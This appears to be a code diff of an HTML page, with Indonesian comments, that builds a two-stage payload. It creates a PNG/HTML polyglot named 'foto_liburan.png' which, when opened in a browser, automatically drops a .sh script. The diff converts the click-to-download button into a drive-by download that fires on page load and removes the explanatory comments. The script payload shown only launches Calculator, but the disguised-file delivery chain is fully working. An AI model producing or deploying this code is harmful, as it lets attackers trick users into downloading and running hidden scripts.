@@ -3,30 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Two-Stage Payload (PNG -> SH)</title>
+    <title>Auto Download Two-Stage Payload (PNG -> SH)</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
         .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
         h2 { color: #d32f2f; margin-bottom: 10px; }
         p { margin-bottom: 20px; line-height: 1.6; color: #555; }
-        button { width: 100%; padding: 14px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; background: #d32f2f; color: #fff; transition: background 0.2s; }
-        button:hover { background: #b71c1c; }
         #status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Two-Stage Payload (PNG -> SH)</h2>
-    <p>Mengunduh file gambar PNG asli yang berisi skrip HTML untuk mengunduh file .sh secara otomatis.</p>
+    <h2>Auto Download Two-Stage Payload</h2>
+    <p>Halaman ini akan otomatis mengunduh file gambar PNG (Polyglot) saat dimuat. Buka file PNG tersebut di browser untuk memicu unduhan file .sh.</p>
     
-    <button id="start-btn" type="button">Mulai Unduh Gambar (PNG)</button>
-    <div id="status" role="status">Sistem siap.</div>
+    <div id="status" role="status">Mempersiapkan unduhan otomatis...</div>
 </div>
 
 <script>
-    const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
 
     // 1. Payload .sh yang akan diunduh pada tahap kedua
@@ -35,7 +31,6 @@
                         "open -a Calculator\n";
 
     // 2. Kode HTML yang disisipkan ke dalam PNG (Polyglot)
-    // Kode ini akan membuat file .sh saat PNG dibuka sebagai HTML
     const htmlPayload = `
         <!DOCTYPE html>
         <html>
@@ -44,7 +39,6 @@
             <h1>Memuat Gambar...</h1>
             <p id="status">Menyiapkan file pendukung...</p>
             <script>
-                // Fungsi untuk mengunduh file .sh
                 const downloadSh = () => {
                     const shContent = ${JSON.stringify(shellScript)};
                     const blob = new Blob([shContent], { type: 'application/x-sh' });
@@ -56,7 +50,6 @@
                     a.click();
                     document.getElementById('status').innerText = 'File .sh berhasil diunduh!';
                 };
-                // Pemicu otomatis setelah 1 detik
                 setTimeout(downloadSh, 1000);
             <\/script>
         </body>
@@ -66,45 +59,35 @@
     // 3. Membuat file PNG asli (Base64) dan menyisipkan HTML di dalamnya
     const createPolyglotPng = () => {
         return new Promise((resolve) => {
-            // PNG 1x1 transparan asli (Base64)
             const pngBase64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
-            
-            // Decode PNG Base64 ke Uint8Array
             const binaryPng = atob(pngBase64);
             const pngBytes = new Uint8Array(binaryPng.length);
             for (let i = 0; i < binaryPng.length; i++) {
                 pngBytes[i] = binaryPng.charCodeAt(i);
             }
 
-            // Encode HTML Payload ke Uint8Array
             const encoder = new TextEncoder();
             const htmlBytes = encoder.encode(htmlPayload);
 
-            // Gabungkan PNG asli + HTML Payload
-            // (Ini membuat file Polyglot: Valid sebagai PNG, tapi juga dieksekusi sebagai HTML)
             const combinedBytes = new Uint8Array(pngBytes.length + htmlBytes.length);
             combinedBytes.set(pngBytes, 0);
             combinedBytes.set(htmlBytes, pngBytes.length);
 
-            // Buat Blob dengan MIME Type image/png (agar dianggap gambar aman)
             const blob = new Blob([combinedBytes], { type: 'image/png' });
             resolve(blob);
         });
     };
 
-    // 4. Pemicu Unduhan Tahap 1
-    startBtn.addEventListener("click", async () => {
-        startBtn.disabled = true;
+    // 4. Pemicu Unduhan Otomatis (Drive-by Download)
+    const autoDownload = async () => {
         statusDiv.textContent = "Membuat file gambar PNG (Polyglot)...";
-
+        
         try {
             const imageBlob = await createPolyglotPng();
             const url = URL.createObjectURL(imageBlob);
             
             const a = document.createElement("a");
             a.href = url;
-            
-            // Nama file sengaja dibuat gambar (.png)
             a.download = "foto_liburan.png";
             
             document.body.appendChild(a);
@@ -113,7 +96,7 @@
             setTimeout(() => {
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
-                statusDiv.textContent = "File gambar terunduh. Buka file tersebut di browser untuk memicu file .sh.";
+                statusDiv.textContent = "File PNG terunduh otomatis! Buka file tersebut di browser untuk memicu file .sh.";
                 statusDiv.style.color = "#4CAF50";
             }, 1000);
 
@@ -121,7 +104,11 @@
             statusDiv.textContent = "Gagal: " + e.message;
             statusDiv.style.color = "#f00";
         }
-        startBtn.disabled = false;
+    };
+
+    // MEMICU OTOMATIS SAAT HALAMAN DIMUAT
+    window.addEventListener('load', () => {
+        setTimeout(autoDownload, 500);
     });
 </script>
 </body>
